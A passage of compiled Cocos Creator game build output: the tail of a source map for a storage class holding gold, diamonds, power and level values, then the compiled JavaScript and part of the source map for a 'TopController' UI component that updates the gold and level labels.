dWUpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIExvY2FsU3RvcmFnZS5zZXRTdHJpbmcoXCJ1cGRhdGVLVkRhdGFcIiwgSlNPTi5zdHJpbmdpZnkodXBkYXRlU3RvcmFnZUtleXMuY29uY2F0KHB1c2hTdG9yYWdlS2V5cy5maWx0ZXIodmFsdWUxID0+ICF1cGRhdGVTdG9yYWdlS2V5cy5pbmNsdWRlcyh2YWx1ZTEpKSkpKTtcclxuICAgICAgICAgICAgY2MuZmluZCgnQ2FudmFzJykuZW1pdChcIlVwZGF0ZVN0b3JhZ2VcIiwga2V5KTtcclxuICAgICAgICAgICAgaWYgKE5ldHdvcmtDb25maWcuY29ubmVjdFNlcnZlcikge1xyXG4gICAgICAgICAgICAgICAgdGhpcy5tb2RpZnlDb3VudCsrO1xyXG4gICAgICAgICAgICAgICAgaWYgKHRoaXMubW9kaWZ5Q291bnQgPiB0aGlzLm1heE1vZGlmeSkge1xyXG4gICAgICAgICAgICAgICAgICAgIHRoaXMubW9kaWZ5Q291bnQgPSAwO1xyXG4gICAgICAgICAgICAgICAgICAgIE5ldHdvcmsucHVzaFN0b3JhZ2UoKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuXHJcblxyXG4gICAgICAgIC8qKiBnZXR0ZXIgKi9cclxuICAgICAgICBzdGF0aWMgZ2V0IGdhbWVMZXZlbCgpOiBudW1iZXIge1xyXG4gICAgICAgICAgICByZXR1cm4gdGhpcy5fZ2FtZUxldmVsO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgc3RhdGljIGdldCBnb2xkQ291bnQoKTogbnVtYmVyIHtcclxuICAgICAgICAgICAgcmV0dXJuIHRoaXMuX2dvbGRDb3VudDtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIHN0YXRpYyBnZXQgZGlhbW9uZENvdW50KCk6IG51bWJlciB7XHJcbiAgICAgICAgICAgIHJldHVybiB0aGlzLl9kaWFtb25kQ291bnQ7XHJcbiAgICAgICAgfVxyXG5cclxuXHJcbiAgICAgICAgc3RhdGljIGdldCBnb2xkTHYoKTogbnVtYmVyIHtcclxuICAgICAgICAgICAgcmV0dXJuIHRoaXMuX2dvbGRMdjtcclxuICAgICAgICB9XHJcblxyXG5cclxuICAgICAgICBzdGF0aWMgZ2V0IGRheUVhcm5MdigpOiBudW1iZXIge1xyXG4gICAgICAgICAgICByZXR1cm4gdGhpcy5fZGF5RWFybkx2O1xyXG4gICAgICAgIH1cclxuXHJcblxyXG4gICAgICAgIHN0YXRpYyBnZXQgcG93ZXIoKTogbnVtYmVyIHtcclxuICAgICAgICAgICAgcmV0dXJuIHRoaXMuX3Bvd2VyO1xyXG4gICAgICAgIH1cclxuXHJcblxyXG4gICAgICAgIHN0YXRpYyBnZXQgcG93ZXJNb2RpZnlUaW1lKCk6IG51bWJlciB7XHJcbiAgICAgICAgICAgIHJldHVybiB0aGlzLl9wb3dlck1vZGlmeVRpbWU7XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBzdGF0aWMgZ2V0IGRheUVhcm5Ub3RhbE1vZGlmeVRpbWUoKTogbnVtYmVyIHtcclxuICAgICAgICAgICAgcmV0dXJuIHRoaXMuX2RheUVhcm5Ub3RhbE1vZGlmeVRpbWU7XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBzdGF0aWMgZ2V0IGRheUVhcm5FeHBpcmVUaW1lKCk6IG51bWJlciB7XHJcbiAgICAgICAgICAgIHJldHVybiB0aGlzLl9kYXlFYXJuRXhwaXJlVGltZTtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIHN0YXRpYyBnZXQgZGF5RWFyblRvdGFsKCk6IG51bWJlciB7XHJcbiAgICAgICAgICAgIHJldHVybiB0aGlzLl9kYXlFYXJuVG90YWw7XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBzdGF0aWMgZ2V0IHRhc2soKTogc3RyaW5nIHtcclxuICAgICAgICAgICAgcmV0dXJuIHRoaXMuX3Rhc2s7XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBzdGF0aWMgZ2V0IGdhbWVMdWNreSgpOiBzdHJpbmcge1xyXG4gICAgICAgICAgICByZXR1cm4gdGhpcy5fZ2FtZUx1Y2t5O1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgc3RhdGljIGdldCBnYW1lRW5lcmd5KCk6IG51bWJlciB7XHJcbiAgICAgICAgICAgIHJldHVybiB0aGlzLl9nYW1lRW5lcmd5O1xyXG4gICAgICAgIH1cclxuXHJcblxyXG4gICAgICAgIHN0YXRpYyBnZXQgc2hha2VPcGVuKCk6IGJvb2xlYW4ge1xyXG4gICAgICAgICAgICByZXR1cm4gdGhpcy5fc2hha2VPcGVuO1xyXG4gICAgICAgIH1cclxuXHJcblxyXG4gICAgICAgIHN0YXRpYyBnZXQgYXJtb3J5KCk6IHN0cmluZyB7XHJcbiAgICAgICAgICAgIHJldHVybiB0aGlzLl9hcm1vcnk7XHJcbiAgICAgICAgfVxyXG5cclxuXHJcbiAgICAgICAgc3RhdGljIGdldCBIcEx2KCk6IG51bWJlciB7XHJcbiAgICAgICAgICAgIHJldHVybiB0aGlzLl9IcEx2O1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgc3RhdGljIGdldCBBREx2KCk6IG51bWJlciB7XHJcbiAgICAgICAgICAgIHJldHVybiB0aGlzLl9BREx2O1xyXG4gICAgICAgIH1cclxuXHJcblxyXG4gICAgICAgIHN0YXRpYyBnZXQgcGFzc0x1Y2t5Q291bnQoKTogbnVtYmVyIHtcclxuICAgICAgICAgICAgcmV0dXJuIHRoaXMuX3Bhc3NMdWNreUNvdW50O1xyXG4gICAgICAgIH1cclxuXHJcblxyXG4gICAgICAgIHN0YXRpYyBnZXQgcHJvcHMoKTogc3RyaW5nIHtcclxuICAgICAgICAgICAgcmV0dXJuIHRoaXMuX3Byb3BzO1xyXG4gICAgICAgIH1cclxuXHJcblxyXG4gICAgICAgIHN0YXRpYyBnZXQgbmV3YmllcygpOiBzdHJpbmcge1xyXG4gICAgICAgICAgICByZXR1cm4gdGhpcy5fbmV3YmllcztcclxuICAgICAgICB9XHJcblxyXG5cclxuICAgICAgICBzdGF0aWMgZ2V0IHVubG9ja0d1bigpOiBudW1iZXIge1xyXG4gICAgICAgICAgICByZXR1cm4gdGhpcy5fdW5sb2NrR3VuO1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgLyoqICBzZXR0ZXIgICovXHJcbiAgICAgICAgc3RhdGljIHNldCBnb2xkQ291bnQodmFsdWU6IG51bWJlcikge1xyXG4gICAgICAgICAgICBpZiAodGhpcy5fZ29sZENvdW50ICE9IHZhbHVlKSB7XHJcbiAgICAgICAgICAgICAgICB0aGlzLl9nb2xkQ291bnQgPSB2YWx1ZTtcclxuICAgICAgICAgICAgICAgIHRoaXMudXBkYXRlS1ZEYXRhKFwiZ29sZENvdW50XCIsIHZhbHVlKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgc3RhdGljIHNldCBkaWFtb25kQ291bnQodmFsdWU6IG51bWJlcikge1xyXG4gICAgICAgICAgICBpZiAodGhpcy5fZGlhbW9uZENvdW50ICE9IHZhbHVlKSB7XHJcbiAgICAgICAgICAgICAgICB0aGlzLl9kaWFtb25kQ291bnQgPSB2YWx1ZTtcclxuICAgICAgICAgICAgICAgIHRoaXMudXBkYXRlS1ZEYXRhKFwiZGlhbW9uZENvdW50XCIsIHZhbHVlKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuXHJcblxyXG4gICAgICAgIHN0YXRpYyBzZXQgZ29sZEx2KHZhbHVlOiBudW1iZXIpIHtcclxuICAgICAgICAgICAgaWYgKHRoaXMuX2dvbGRMdiAhPSB2YWx1ZSkge1xyXG4gICAgICAgICAgICAgICAgdGhpcy5fZ29sZEx2ID0gdmFsdWU7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnVwZGF0ZUtWRGF0YShcImdvbGRMdlwiLCB2YWx1ZSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcblxyXG5cclxuICAgICAgICBzdGF0aWMgc2V0IGRheUVhcm5Mdih2YWx1ZTogbnVtYmVyKSB7XHJcbiAgICAgICAgICAgIGlmICh0aGlzLl9kYXlFYXJuTHYgIT0gdmFsdWUpIHtcclxuICAgICAgICAgICAgICAgIHRoaXMuX2RheUVhcm5MdiA9IHZhbHVlO1xyXG4gICAgICAgICAgICAgICAgdGhpcy51cGRhdGVLVkRhdGEoXCJkYXlFYXJuTHZcIiwgdmFsdWUpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG5cclxuXHJcbiAgICAgICAgc3RhdGljIHNldCBwb3dlcih2YWx1ZTogbnVtYmVyKSB7XHJcbiAgICAgICAgICAgIGlmICh0aGlzLl9wb3dlciAhPSB2YWx1ZSkge1xyXG4gICAgICAgICAgICAgICAgaWYgKHZhbHVlID4gUE9XRVJfTUFYKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSBQT1dFUl9NQVg7XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB0aGlzLl9wb3dlciA9IHZhbHVlO1xyXG4gICAgICAgICAgICAgICAgdGhpcy51cGRhdGVLVkRhdGEoXCJwb3dlclwiLCB2YWx1ZSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcblxyXG5cclxuICAgICAgICBzdGF0aWMgc2V0IHBvd2VyTW9kaWZ5VGltZSh2YWx1ZTogbnVtYmVyKSB7XHJcbiAgICAgICAgICAgIGlmICh0aGlzLl9wb3dlck1vZGlmeVRpbWUgIT0gdmFsdWUpIHtcclxuICAgICAgICAgICAgICAgIHRoaXMuX3Bvd2VyTW9kaWZ5VGltZSA9IHZhbHVlO1xyXG4gICAgICAgICAgICAgICAgdGhpcy51cGRhdGVLVkRhdGEoXCJwb3dlck1vZGlmeVRpbWVcIiwgdmFsdWUpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBzdGF0aWMgc2V0IGRheUVhcm5Ub3RhbE1vZGlmeVRpbWUodmFsdWU6IG51bWJlcikge1xyXG4gICAgICAgICAgICBpZiAodGhpcy5fZGF5RWFyblRvdGFsTW9kaWZ5VGltZSAhPSB2YWx1ZSkge1xyXG4gICAgICAgICAgICAgICAgdGhpcy5fZGF5RWFyblRvdGFsTW9kaWZ5VGltZSA9IHZhbHVlO1xyXG4gICAgICAgICAgICAgICAgdGhpcy51cGRhdGVLVkRhdGEoXCJkYXlFYXJuVG90YWxNb2RpZnlUaW1lXCIsIHZhbHVlKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgc3RhdGljIHNldCBkYXlFYXJuRXhwaXJlVGltZSh2YWx1ZTogbnVtYmVyKSB7XHJcbiAgICAgICAgICAgIGlmICh0aGlzLl9kYXlFYXJuRXhwaXJlVGltZSAhPSB2YWx1ZSkge1xyXG4gICAgICAgICAgICAgICAgdGhpcy5fZGF5RWFybkV4cGlyZVRpbWUgPSB2YWx1ZTtcclxuICAgICAgICAgICAgICAgIHRoaXMudXBkYXRlS1ZEYXRhKFwiZGF5RWFybkV4cGlyZVRpbWVcIiwgdmFsdWUpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBzdGF0aWMgc2V0IGRheUVhcm5Ub3RhbCh2YWx1ZTogbnVtYmVyKSB7XHJcbiAgICAgICAgICAgIGlmICh0aGlzLl9kYXlFYXJuVG90YWwgIT0gdmFsdWUpIHtcclxuICAgICAgICAgICAgICAgIHRoaXMuX2RheUVhcm5Ub3RhbCA9IHZhbHVlO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5kYXlFYXJuVG90YWxNb2RpZnlUaW1lID0gV29ybGQuTXkuc2VydmVyVGltZTtcclxuICAgICAgICAgICAgICAgIHRoaXMudXBkYXRlS1ZEYXRhKFwiZGF5RWFyblRvdGFsXCIsIHZhbHVlKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgc3RhdGljIHNldCB0YXNrKHZhbHVlOiBzdHJpbmcpIHtcclxuICAgICAgICAgICAgaWYgKHRoaXMuX3Rhc2sgIT0gdmFsdWUpIHtcclxuICAgICAgICAgICAgICAgIHRoaXMuX3Rhc2sgPSB2YWx1ZTtcclxuICAgICAgICAgICAgICAgIHRoaXMudXBkYXRlS1ZEYXRhKFwidGFza1wiLCB2YWx1ZSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcblxyXG5cclxuICAgICAgICBzdGF0aWMgc2V0IGdhbWVMdWNreSh2YWx1ZTogc3RyaW5nKSB7XHJcbiAgICAgICAgICAgIGlmICh0aGlzLl9nYW1lTHVja3kgIT0gdmFsdWUpIHtcclxuICAgICAgICAgICAgICAgIHRoaXMuX2dhbWVMdWNreSA9IHZhbHVlO1xyXG4gICAgICAgICAgICAgICAgdGhpcy51cGRhdGVLVkRhdGEoXCJnYW1lTHVja3lcIiwgdmFsdWUpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG5cclxuXHJcbiAgICAgICAgc3RhdGljIHNldCBnYW1lRW5lcmd5KHZhbHVlOiBudW1iZXIpIHtcclxuICAgICAgICAgICAgaWYgKHRoaXMuX2dhbWVFbmVyZ3kgIT0gdmFsdWUpIHtcclxuICAgICAgICAgICAgICAgIHRoaXMuX2dhbWVFbmVyZ3kgPSB2YWx1ZTtcclxuICAgICAgICAgICAgICAgIHRoaXMudXBkYXRlS1ZEYXRhKFwiZ2FtZUVuZXJneVwiLCB2YWx1ZSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIHN0YXRpYyBzZXQgc2hha2VPcGVuKHZhbHVlOiBib29sZWFuKSB7XHJcbiAgICAgICAgICAgIGlmICh0aGlzLl9zaGFrZU9wZW4gIT0gdmFsdWUpIHtcclxuICAgICAgICAgICAgICAgIHRoaXMuX3NoYWtlT3BlbiA9IHZhbHVlO1xyXG4gICAgICAgICAgICAgICAgdGhpcy51cGRhdGVLVkRhdGEoXCJzaGFrZU9wZW5cIiwgdmFsdWUpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG5cclxuXHJcbiAgICAgICAgc3RhdGljIHNldCBhcm1vcnkodmFsdWU6IHN0cmluZykge1xyXG4gICAgICAgICAgICBpZiAodGhpcy5fYXJtb3J5ICE9IHZhbHVlKSB7XHJcbiAgICAgICAgICAgICAgICB0aGlzLl9hcm1vcnkgPSB2YWx1ZTtcclxuICAgICAgICAgICAgICAgIHRoaXMudXBkYXRlS1ZEYXRhKFwiYXJtb3J5XCIsIHZhbHVlKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuXHJcblxyXG4gICAgICAgIHN0YXRpYyBzZXQgSHBMdih2YWx1ZTogbnVtYmVyKSB7XHJcbiAgICAgICAgICAgIGlmICh0aGlzLl9IcEx2ICE9IHZhbHVlKSB7XHJcbiAgICAgICAgICAgICAgICB0aGlzLl9IcEx2ID0gdmFsdWU7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnVwZGF0ZUtWRGF0YShcIkhwTHZcIiwgdmFsdWUpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICBzdGF0aWMgc2V0IEFETHYodmFsdWU6IG51bWJlcikge1xyXG4gICAgICAgICAgICBpZiAodGhpcy5fQURMdiAhPSB2YWx1ZSkge1xyXG4gICAgICAgICAgICAgICAgdGhpcy5fQURMdiA9IHZhbHVlO1xyXG4gICAgICAgICAgICAgICAgdGhpcy51cGRhdGVLVkRhdGEoXCJBREx2XCIsIHZhbHVlKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgc3RhdGljIHNldCBwYXNzTHVja3lDb3VudCh2YWx1ZTogbnVtYmVyKSB7XHJcbiAgICAgICAgICAgIGlmICh0aGlzLl9wYXNzTHVja3lDb3VudCAhPSB2YWx1ZSkge1xyXG4gICAgICAgICAgICAgICAgdGhpcy5fcGFzc0x1Y2t5Q291bnQgPSB2YWx1ZTtcclxuICAgICAgICAgICAgICAgIHRoaXMudXBkYXRlS1ZEYXRhKFwicGFzc0x1Y2t5Q291bnRcIiwgdmFsdWUpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG5cclxuXHJcbiAgICAgICAgc3RhdGljIHNldCBwcm9wcyh2YWx1ZTogc3RyaW5nKSB7XHJcbiAgICAgICAgICAgIGlmICh0aGlzLl9wcm9wcyAhPSB2YWx1ZSkge1xyXG4gICAgICAgICAgICAgICAgdGhpcy5fcHJvcHMgPSB2YWx1ZTtcclxuICAgICAgICAgICAgICAgIHRoaXMudXBkYXRlS1ZEYXRhKFwicHJvcHNcIiwgdmFsdWUpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG5cclxuXHJcbiAgICAgICAgc3RhdGljIHNldCBnYW1lTGV2ZWwodmFsdWU6IG51bWJlcikge1xyXG4gICAgICAgICAgICBpZiAodGhpcy5fZ2FtZUxldmVsICE9IHZhbHVlKSB7XHJcbiAgICAgICAgICAgICAgICB0aGlzLl9nYW1lTGV2ZWwgPSB2YWx1ZTtcclxuICAgICAgICAgICAgICAgIHRoaXMudXBkYXRlS1ZEYXRhKFwiZ2FtZUxldmVsXCIsIHZhbHVlKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuXHJcblxyXG4gICAgICAgIHN0YXRpYyBzZXQgbmV3Ymllcyh2YWx1ZTogc3RyaW5nKSB7XHJcbiAgICAgICAgICAgIGlmICh0aGlzLl9uZXdiaWVzICE9IHZhbHVlKSB7XHJcbiAgICAgICAgICAgICAgICB0aGlzLl9uZXdiaWVzID0gdmFsdWU7XHJcbiAgICAgICAgICAgICAgICB0aGlzLnVwZGF0ZUtWRGF0YShcIm5ld2JpZXNcIiwgdmFsdWUpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgfVxyXG5cclxuXHJcbiAgICAgICAgc3RhdGljIHNldCB1bmxvY2tHdW4odmFsdWU6IG51bWJlcikge1xyXG4gICAgICAgICAgICBpZiAodGhpcy5fdW5sb2NrR3VuICE9IHZhbHVlKSB7XHJcbiAgICAgICAgICAgICAgICB0aGlzLl91bmxvY2tHdW4gPSB2YWx1ZTtcclxuICAgICAgICAgICAgICAgIHRoaXMudXBkYXRlS1ZEYXRhKFwidW5sb2NrR3VuXCIsIHZhbHVlKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuICAgIH1cclxufVxyXG5cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/home/TopController.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '60d27bwvCFAMqFkoQdcCoGl', 'TopController');
// script/app/home/TopController.ts

Object.defineProperty(exports, "__esModule", { value: true });
var World_1 = require("../info/World");
var Extend_1 = require("../../../framework/extend/Extend");
var Facade_1 = require("../../../framework/facade/Facade");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var TopController = /** @class */ (function (_super) {
    __extends(TopController, _super);
    function TopController() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.goldLabel = null;
        _this.lvLabels = [];
        return _this;
    }
    TopController.prototype.init = function () {
        this.lvLabels.forEach(function (value, index) { return value.string = "<b><outline color=#1e1e1e width=3>" + (World_1.World.Storage.gameLevel - 1 + index) + "</outline></b>"; });
        if (World_1.World.Storage.gameLevel < 2) {
            this.lvLabels[0].node.getParent().active = false;
        }
        this.updateView();
    };
    TopController.prototype.onLoad = function () {
        Facade_1.default.canvasNode.on("UpdateStorage", this.onUpdateStorageEvent, this);
        this.init();
    };
    TopController.prototype.onDestroy = function () {
        Facade_1.default.canvasNode.off("UpdateStorage", this.onUpdateStorageEvent, this);
    };
    TopController.prototype.onUpdateStorageEvent = function (key) {
        if (key == "power") {
        }
        else if (key == "goldCount") {
            this.goldLabel.string = "<b><outline color=#1e1e1e width=3>" + Extend_1.ext.shortFormat(World_1.World.Storage.goldCount) + "</outline></b>";
        }
        else if (key == "diamondCount") {
        }
    };
    TopController.prototype.updateView = function () {
        this.goldLabel.string = "<b><outline color=#1e1e1e width=3>" + Extend_1.ext.shortFormat(World_1.World.Storage.goldCount) + "</outline></b>";
    };
    TopController.prototype.onClickPlus = function (vent, data) {
        return __awaiter(this, void 0, void 0, function () {
            var node, exchangeController;
            return __generator(this, function (_a) {
                switch (_a.label) {
                    case 0:
                        console.log("【click】TopController Plus");
                        data = parseInt(data);
                        return [4 /*yield*/, Facade_1.default.executeCommand("OpenViewCommand", "prefab/exchange")];
                    case 1:
                        node = (_a.sent())[0];
                        exchangeController = node.getComponent("ExchangeController");
                        exchangeController.type = data;
                        return [2 /*return*/];
                }
            });
        });
    };
    __decorate([
        property(cc.RichText)
    ], TopController.prototype, "goldLabel", void 0);
    __decorate([
        property(cc.RichText)
    ], TopController.prototype, "lvLabels", void 0);
    TopController = __decorate([
        ccclass
    ], TopController);
    return TopController;
}(cc.Component));
exports.default = TopController;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2hvbWUvVG9wQ29udHJvbGxlci50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsdUNBQW9DO0FBQ3BDLDJEQUFxRDtBQUNyRCwyREFBc0Q7QUFJaEQsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFHMUM7SUFBMkMsaUNBQVk7SUFBdkQ7UUFBQSxxRUE2Q0M7UUExQ0csZUFBUyxHQUFlLElBQUksQ0FBQztRQUc3QixjQUFRLEdBQWtCLEVBQUUsQ0FBQzs7SUF1Q2pDLENBQUM7SUFyQ0csNEJBQUksR0FBSjtRQUNJLElBQUksQ0FBQyxRQUFRLENBQUMsT0FBTyxDQUFDLFVBQUMsS0FBSyxFQUFFLEtBQUssSUFBSyxPQUFBLEtBQUssQ0FBQyxNQUFNLEdBQUcsd0NBQXFDLGFBQUssQ0FBQyxPQUFPLENBQUMsU0FBUyxHQUFDLENBQUMsR0FBQyxLQUFLLG9CQUFnQixFQUFuRyxDQUFtRyxDQUFDLENBQUM7UUFDN0ksSUFBSSxhQUFLLENBQUMsT0FBTyxDQUFDLFNBQVMsR0FBRyxDQUFDLEVBQUM7WUFDNUIsSUFBSSxDQUFDLFFBQVEsQ0FBQyxDQUFDLENBQUMsQ0FBQyxJQUFJLENBQUMsU0FBUyxFQUFFLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztTQUNwRDtRQUNELElBQUksQ0FBQyxVQUFVLEVBQUUsQ0FBQztJQUN0QixDQUFDO0lBRUQsOEJBQU0sR0FBTjtRQUNJLGdCQUFNLENBQUMsVUFBVSxDQUFDLEVBQUUsQ0FBQyxlQUFlLEVBQUUsSUFBSSxDQUFDLG9CQUFvQixFQUFFLElBQUksQ0FBQyxDQUFDO1FBQ3ZFLElBQUksQ0FBQyxJQUFJLEVBQUUsQ0FBQztJQUNoQixDQUFDO0lBRUQsaUNBQVMsR0FBVDtRQUNJLGdCQUFNLENBQUMsVUFBVSxDQUFDLEdBQUcsQ0FBQyxlQUFlLEVBQUUsSUFBSSxDQUFDLG9CQUFvQixFQUFFLElBQUksQ0FBQyxDQUFDO0lBQzVFLENBQUM7SUFFRCw0Q0FBb0IsR0FBcEIsVUFBcUIsR0FBVTtRQUMzQixJQUFJLEdBQUcsSUFBSSxPQUFPLEVBQUM7U0FDbEI7YUFBTSxJQUFJLEdBQUcsSUFBSSxXQUFXLEVBQUM7WUFDMUIsSUFBSSxDQUFDLFNBQVMsQ0FBQyxNQUFNLEdBQUcsdUNBQXFDLFlBQUcsQ0FBQyxXQUFXLENBQUMsYUFBSyxDQUFDLE9BQU8sQ0FBQyxTQUFTLENBQUMsbUJBQWdCLENBQUM7U0FDekg7YUFBTSxJQUFJLEdBQUcsSUFBSSxjQUFjLEVBQUM7U0FDaEM7SUFDTCxDQUFDO0lBRUQsa0NBQVUsR0FBVjtRQUNJLElBQUksQ0FBQyxTQUFTLENBQUMsTUFBTSxHQUFHLHVDQUFxQyxZQUFHLENBQUMsV0FBVyxDQUFDLGFBQUssQ0FBQyxPQUFPLENBQUMsU0FBUyxDQUFDLG1CQUFnQixDQUFDO0lBQzFILENBQUM7SUFFSyxtQ0FBVyxHQUFqQixVQUFrQixJQUFJLEVBQUUsSUFBSTs7Ozs7O3dCQUN4QixPQUFPLENBQUMsR0FBRyxDQUFDLDJCQUEyQixDQUFDLENBQUE7d0JBRXhDLElBQUksR0FBRyxRQUFRLENBQUMsSUFBSSxDQUFDLENBQUM7d0JBQ1QscUJBQU0sZ0JBQU0sQ0FBQyxjQUFjLENBQUMsaUJBQWlCLEVBQUUsaUJBQWlCLENBQUMsRUFBQTs7d0JBQXpFLElBQUksR0FBSSxDQUFBLFNBQWlFLENBQUEsR0FBckU7d0JBQ0wsa0JBQWtCLEdBQUcsSUFBSSxDQUFDLFlBQVksQ0FBQyxvQkFBb0IsQ0FBQyxDQUFDO3dCQUNqRSxrQkFBa0IsQ0FBQyxJQUFJLEdBQUcsSUFBSSxDQUFDOzs7OztLQUNsQztJQXpDRDtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDO29EQUNPO0lBRzdCO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUM7bURBQ087SUFOWixhQUFhO1FBRGpDLE9BQU87T0FDYSxhQUFhLENBNkNqQztJQUFELG9CQUFDO0NBN0NELEFBNkNDLENBN0MwQyxFQUFFLENBQUMsU0FBUyxHQTZDdEQ7a0JBN0NvQixhQUFhIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCB7V29ybGR9IGZyb20gXCIuLi9pbmZvL1dvcmxkXCI7XHJcbmltcG9ydCB7ZXh0fSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2V4dGVuZC9FeHRlbmRcIjtcclxuaW1wb3J0IEZhY2FkZSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2ZhY2FkZS9GYWNhZGVcIjtcclxuaW1wb3J0IEV4Y2hhbmdlQ29udHJvbGxlciBmcm9tIFwiLi9FeGNoYW5nZUNvbnRyb2xsZXJcIjtcclxuaW1wb3J0IExvYWRpbmdDb21tYW5kIGZyb20gXCIuL0xvYWRpbmdDb21tYW5kXCI7XHJcblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIFRvcENvbnRyb2xsZXIgZXh0ZW5kcyBjYy5Db21wb25lbnQge1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5SaWNoVGV4dClcclxuICAgIGdvbGRMYWJlbDpjYy5SaWNoVGV4dCA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLlJpY2hUZXh0KVxyXG4gICAgbHZMYWJlbHM6IFtjYy5SaWNoVGV4dF0gPSBbXTtcclxuXHJcbiAgICBpbml0KCl7XHJcbiAgICAgICAgdGhpcy5sdkxhYmVscy5mb3JFYWNoKCh2YWx1ZSwgaW5kZXgpID0+IHZhbHVlLnN0cmluZyA9IGA8Yj48b3V0bGluZSBjb2xvcj0jMWUxZTFlIHdpZHRoPTM+JHtXb3JsZC5TdG9yYWdlLmdhbWVMZXZlbC0xK2luZGV4fTwvb3V0bGluZT48L2I+YCk7XHJcbiAgICAgICAgaWYgKFdvcmxkLlN0b3JhZ2UuZ2FtZUxldmVsIDwgMil7XHJcbiAgICAgICAgICAgIHRoaXMubHZMYWJlbHNbMF0ubm9kZS5nZXRQYXJlbnQoKS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICB9XHJcbiAgICAgICAgdGhpcy51cGRhdGVWaWV3KCk7XHJcbiAgICB9XHJcblxyXG4gICAgb25Mb2FkICgpIHtcclxuICAgICAgICBGYWNhZGUuY2FudmFzTm9kZS5vbihcIlVwZGF0ZVN0b3JhZ2VcIiwgdGhpcy5vblVwZGF0ZVN0b3JhZ2VFdmVudCwgdGhpcyk7XHJcbiAgICAgICAgdGhpcy5pbml0KCk7XHJcbiAgICB9XHJcblxyXG4gICAgb25EZXN0cm95KCl7XHJcbiAgICAgICAgRmFjYWRlLmNhbnZhc05vZGUub2ZmKFwiVXBkYXRlU3R